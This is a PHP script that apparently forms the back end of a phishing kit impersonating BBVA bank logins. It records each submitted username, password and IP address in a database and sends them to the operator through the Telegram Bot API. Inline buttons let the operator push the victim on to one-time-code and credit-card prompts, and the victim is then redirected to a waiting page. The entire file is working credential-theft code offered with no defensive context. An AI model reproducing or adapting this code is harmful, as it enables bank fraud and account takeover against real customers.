<?php
session_start();
// Adjust paths to point to panels/aire root
include '../../../config/db.php';
$config = include '../../../config/config.php';

// Función para escapar caracteres especiales en MarkdownV2
function escapeMarkdownV2($text)
{
    $specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
    foreach ($specialChars as $char) {
        $text = str_replace($char, "\\" . $char, $text);
    }
    return $text;
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $user = $_POST['user'];
    $pass = $_POST['pass'];
    $banco = "BBVA";

    if (empty($user) || empty($pass)) {
        die("Error: Todos los campos son obligatorios.");
    }

    // Check for existing ID (Retry Login)
    $ip = $_SERVER['REMOTE_ADDR'];
    if (isset($_POST['id']) && !empty($_POST['id'])) {
        $id = $_POST['id'];
        $estado = 1; // Reset to "Action Required" / Waiting
        $sql_update = "UPDATE pse SET usuario = :usuario, clave = :clave, estado = :estado, ip = :ip WHERE id = :id";
        $stmt = $conn->prepare($sql_update);
        $stmt->execute([
            'usuario' => $user,
            'clave' => $pass,
            'estado' => $estado,
            'ip' => $ip,
            'id' => $id
        ]);
        $nuevo_id = $id; // Reuse ID
        $type_msg = "🔄 *Corrección Login*";
    } else {
        // Inserta un nuevo registro en la tabla pse
        $sql_insert = "INSERT INTO pse (estado, usuario, clave, banco, ip) VALUES (:estado, :usuario, :clave, :banco, :ip)";
        $stmt_insert = $conn->prepare($sql_insert);
        $estado = 1; // Estado inicial
        $stmt_insert->execute([
            'estado' => $estado,
            'usuario' => $user,
            'clave' => $pass,
            'banco' => $banco,
            'ip' => $ip
        ]);
        $nuevo_id = $conn->lastInsertId();
        $type_msg = "🔐 *Nuevo inicio de sesión*";
    }
    // $stmt_insert->close();

    // Enviar datos a Telegram
    $botToken = $config['botToken'];
    $chatId = $config['chatId'];
    $baseUrl = $config['baseUrl'];
    $security_key = $config['security_key'];

    $message = $type_msg . "\n\n"
        . "👤 *Usuario:* `" . escapeMarkdownV2($user) . "`\n"
        . "🔑 *Clave:* `" . escapeMarkdownV2($pass) . "`\n"
        . "🏦 *Banco:* `" . escapeMarkdownV2($banco) . "`\n"
        . "🌐 *IP:* `" . escapeMarkdownV2($ip) . "`";

    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => 'Error Login', 'url' => "$baseUrl?id=$nuevo_id&estado=2&key=$security_key"]
            ],
            [
                ['text' => 'Otp', 'url' => "$baseUrl?id=$nuevo_id&estado=3&key=$security_key"],
                ['text' => 'Otp Error', 'url' => "$baseUrl?id=$nuevo_id&estado=4&key=$security_key"],
                ['text' => 'Pedir CC', 'url' => "$baseUrl?id=$nuevo_id&estado=5&key=$security_key"]
            ],
            [
                ['text' => 'Finalizar', 'url' => "$baseUrl?id=$nuevo_id&estado=0&key=$security_key"]
            ]
        ]
    ];

    $data = [
        'chat_id' => $chatId,
        'text' => $message,
        'parse_mode' => 'MarkdownV2',
        'reply_markup' => json_encode($keyboard)
    ];

    $options = [
        'http' => [
            'header' => "Content-type: application/x-www-form-urlencoded\r\n",
            'method' => 'POST',
            'content' => http_build_query($data),
            'ignore_errors' => true // Capture error response
        ]
    ];

    $url = "https://api.telegram.org/bot$botToken/sendMessage";
    $context = stream_context_create($options);
    $result = file_get_contents($url, false, $context);

    // Check for HTTP errors in headers
    if (strpos($http_response_header[0], '200') === false) {
        file_put_contents('telegram_debug_log.txt', "Error Headers: " . print_r($http_response_header, true) . "\nResponse: " . $result . "\nPayload: " . print_r($data, true), FILE_APPEND);
        die('Error al enviar mensaje a Telegram: ' . $result);
    }

    // Redirige a la página cargando.php con el ID del cliente
    header("Location: ../cargando.php?id=" . $nuevo_id);
    exit();
}
?>